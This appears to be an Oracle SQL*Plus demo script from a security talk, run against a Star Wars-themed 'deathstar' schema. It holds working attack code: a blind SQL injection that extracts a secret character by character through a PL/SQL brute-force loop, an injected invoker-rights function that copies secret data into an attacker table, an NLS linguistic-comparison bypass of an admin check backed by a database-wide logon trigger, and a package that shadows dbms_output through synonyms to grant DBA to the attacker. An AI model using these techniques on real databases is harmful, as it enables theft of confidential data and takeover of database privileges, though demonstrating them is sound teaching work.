#pause
set echo on

select * from deathstar_rooms;
#pause

-- Inject with APEX
#pause

select * from deathstar_rooms;
#pause

#pause/**/



select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
#pause
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
#pause
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
#pause

select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') result from dual;
#pause

set serveroutput on
declare
  l_secret varchar2(4000);

  function chk_char(i_idx integer)
    return varchar2
  as
    l_malicious_stmt varchar2(4000);
  begin
    for char_ascii in 1..90
      loop
        l_malicious_stmt :=
            ''') and exists(select 1 from imperial_secrets where id = 1 and' ||
            ' lower(substr(secret, ' || i_idx || ', 1)) = ''' || lower(chr(char_ascii)) || ''') --';
        if (room_info.get_room_id(l_malicious_stmt) = 1) then
          return chr(char_ascii);
        end if;
      end loop;
    return '?';
  end;
begin
  begin
    for idx in 1..30
      loop
        l_secret := l_secret || chk_char(idx);
      end loop;
  exception
    when others then
      dbms_output.put_line(sqlerrm);
  end;
  dbms_output.put_line('Secret: ' || l_secret);
end;
/
#pause

#pause/**/
select code from deathstar_rooms;
#pause
select * from user_roles;
select * from users;
#pause
call room_info.allow_room_access(2, 1);
#pause
select * from user_roles;
#pause
select * from log_201911;
#pause

#pause/**/

connect sabine/sabine@localhost:1522/ORCLPDB1
#pause

create table secret_dump (
  secret varchar2(4000),
  created timestamp default current_timestamp
);

create or replace function bad_func
  return varchar2 authid current_user -- Invoker's rights!
  as
    pragma autonomous_transaction;
  begin
    execute immediate 'insert into sabine.secret_dump (secret) select secret from imperial_secrets';
    commit;
    return 'Y';
  end;
/

grant execute on bad_func to public;
grant insert on secret_dump to public;
#pause

truncate table secret_dump;
select * from secret_dump;
#pause

select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') from dual;
#pause

select * from secret_dump;
#pause

#pause/**/

ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
#pause
select deathstar.is_admin('aDMIN') from dual;
#pause
select deathstar.is_admin('Ädmin') from dual;
#pause

#pause/**/

create or replace trigger trg_client_detection
after logon
on database
begin
  execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
end;
/
#pause
connect deathstar/deathstar@localhost:1522/ORCLPDB1
#pause
select is_admin('Ädmin') from dual;
#pause

connect sabine/sabine@localhost:1522/ORCLPDB1
create or replace package malicious_dbms_output authid current_user as
  procedure put_line( i_input varchar2 );
end;
/
#pause

create or replace package body malicious_dbms_output as

  procedure grant_us_dba
  as
    pragma autonomous_transaction;
    begin
      execute immediate 'grant dba to sabine';
      sys.dbms_output.put_line('Granting succeeded!'); -- Diese würden im echten Fall natürlich ausgelassen!
    exception when others then
      sys.dbms_output.put_line('Granting DBA not succeeded: ' || sqlerrm); -- Diese würden im echten Fall natürlich ausgelassen!
      null;
    end;

  procedure put_line( i_input varchar2 )
  as
    begin
      grant_us_dba();
      sys.dbms_output.put_line(i_input);
    end;
end;
/
#pause

grant execute on malicious_dbms_output to public;
#pause
select * from user_role_privs;
#pause/**/

select * from user_role_privs;
#pause

create synonym deathstar.dbms_output for malicious_dbms_output;
create synonym darth_dba.dbms_output for malicious_dbms_output;
#pause

select deathstar.room_info.get_room_id('Vader') from dual;
#pause

--     _____                                             __     __)
--    (, /  |              . .    /)                    (, /|  /|
--     ./-- | ___     __   _   _ (/   _  _/_  _ __        / | / |  _____  _    _ __
--   ) /    |_// (_   / (_(_(_(__/ )_/_)_(___(/_/ (_   ) /  |/  |_(_)/ (_(_/__(/_/ (_
--  (_/                                               (_/   '           .-/
--                                                                     (_/

#pause/**/


select * from user_role_privs;